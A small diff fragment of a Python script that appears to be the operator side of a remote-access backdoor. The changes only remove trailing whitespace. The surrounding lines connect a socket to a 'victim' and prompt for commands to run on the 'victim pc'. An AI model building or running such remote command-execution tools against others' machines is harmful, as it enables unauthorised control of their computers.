@@ -8,7 +8,7 @@ def real(HOST, PORT):
 	while True:
 		#Creates a socket which is used to connect to the victim
 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		
+
 		#Attempts to connect to the victim
 		try:
 			s.connect((HOST,PORT))
@@ -19,7 +19,7 @@ def real(HOST, PORT):
 
 		#Asks for a command to execute on victim pc
 		command = input("victim terminal ~ $: ")
-		
+
 		#Special command option, exits realtime modus
 		if command == "exit()":
 			return False
